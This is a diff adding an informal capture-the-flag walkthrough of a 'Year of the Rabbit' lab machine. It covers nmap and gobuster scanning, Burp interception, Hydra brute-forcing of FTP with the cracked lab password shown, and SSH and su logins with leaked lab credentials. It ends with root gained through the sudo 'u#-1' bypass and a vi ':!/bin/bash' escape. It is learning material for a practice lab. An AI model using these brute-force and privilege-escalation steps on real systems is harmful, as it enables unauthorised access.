@@ -1,0 +1,117 @@
+First we do an nmap scan
+	sudo nmap -p- -vvv -sC -sV -Pn -A -O 10.10.174.245
+	we can see that it is a regular linux apache web server
+	we also see both ftp and ssh are open
+		lets see if we can do an anonymous login
+		we cannot with ftp
+While the NMAP scan is still running lets use a directory buster and see if there is anything else we can find
+	gobuster dir -u http://10.10.174.245 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+we can see that we have an assets
+	going there we see rick rolled and style
+	Rick rolled is just what you think it is
+	the styles.css when opened looks like nothing
+	checking the metadata with inspect element shows us some stuff
+/* Nice to see someone checking the stylesheets. Take a look at the page: /sup3r_s3cr3t_fl4g.php
+	Going to that page we see word of advice, turn off your javascript
+		To do this follow the directions below:
+How to Turn Off JavaScript in Firefox
+
+    Enter about:config into the URL bar in Firefox.
+    Select the blue Accept the Risk and Continue button.
+    Enter javascript. enabled into the search box at the top of the page. ...
+    Select the toggle to the right of javascript. ...
+    JavaScript is now disabled in your Firefox browser.
+After turning off Javascript we see the following
+	Love it when people block Javascript...
+This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!
+Make sure your audio is turned up!
+	I couldn't hear anything even with audio turned all the way up
+	Lets do a burpsuite and see if we see anything in there that could be useful
+So after playing around a little bit I noticed that we had to turn javascript back on, then use go to the site with the secret flag.php address
+From here burpsuite will then intercept the packets with a proxy on in firefox, then we need to forward the packets. 
+We see GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
+	That means there is another hidden directory, just like the first time
+Incase your wondering, yes I already tried to use metasploit with the vsftpd, it is not the right version
+Now turn off your proxy and put in the the website, 10.10.174.245/WExYY2Cv-qU
+	Now we see hotbabe file
+		wget http://10.10.88.119/WExYY2Cv-qU/Hot_Babe.png (IP address changed, had to put son down for a nap)
+		Since it is a png file we cannot do a stegcracker on it
+	Something told me to do a cat on the file and see if we can just read it
+	Sure enough there was some stuff in there, and it says one of these are the ftp passwords
+Eh, you've earned this. Username for FTP is ftpuser
+One of these is the password:
+	Copy those passwords and put them in a file
+	To make sure they all stay in order, use vim
+		vim ftp.txt
+		ctrl+shift v
+		:wq
+		cat ftp.txt
+	Everything looks good!
+Now lets use hydra to try and get in through ftp
+	hydra -l ftpuser -P Desktop/year.txt ftp://10.10.88.119
+WE GOT A HIT
+	Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-06 20:49:40
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 83 login tries (l:1/p:83), ~6 tries per task
+[DATA] attacking ftp://10.10.88.119:21/
+[21][ftp] host: 10.10.88.119   login: ftpuser   password: 5iez1wGXKfPKQ
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-06 20:50:06
+
+Lets login and see what we can find
+	we see Eli's txt and that is it
+	get Eli's_Creds.txt
+	exit out of ftp
+and now... we have what is called a brainfuck, no literally that is what the programming language is called..
+	You can actually decode this programming language, here you go
+		https://www.dcode.fr/brainfuck-language
+	Now that we have copied it into the site and decoded it we can use that password, only one thing left ssh
+kali@kali:~$ ssh -l eli 10.10.88.119
+eli@10.10.88.119's password: 
+
+
+
+1 new message
+Message from Root to Gwendoline:
+
+"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
+
+END MESSAGE
+
+Now we have someone named Gwendoline...
+	If we look through the different directories and look through the home directory we can see a Gwendoline folder
+	That then shows us a user.txt but we cannot open it
+	sudo -l shows that eli is useless to this orgnization...
+the leet was really throwing me off and i couldn't figure out why, I then searched leet on google and realized it is elite for gaming, lets look at the game folder
+If we go into cd /usr/games we can see there is another folder called s3cr3t
+Opening the folder we then find the following
+	.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
+cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
+We then find this 60 CHARACTERS LONG LOL
+	Your password is awful, Gwendoline. 
+It should be at least 60 characters long! Not just MniVCQVhQHUNI
+Honestly!
+
+Yours sincerely
+   -Root
+
+su gwendoline
+	MniVCQVhQHUNI
+we can now look at the user.txt file, making life much easier, and hopefully the root.txt file also
+We cannot do root.txt yet but if we do a sudo -l we do get the following
+	
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+What is weird is that it looks like we can use vim for the user.txt file, lets try to do that with sudo 
+       sudo u#-1 /usr/bin/vi /home/gwendoline/user.txt
+We can see that it is a readonly file
+	use the ! to be able to write
+	!whoami
+	and all of sudden root comes up, that is pretty cool
+:!/bin/bash
+	Then when you hit enter you automatically kicked, but we are root!
+cat root/root.txt
+That one was pretty fun and really cool to see what something happeing in Vim, first time for me to see that!
+	
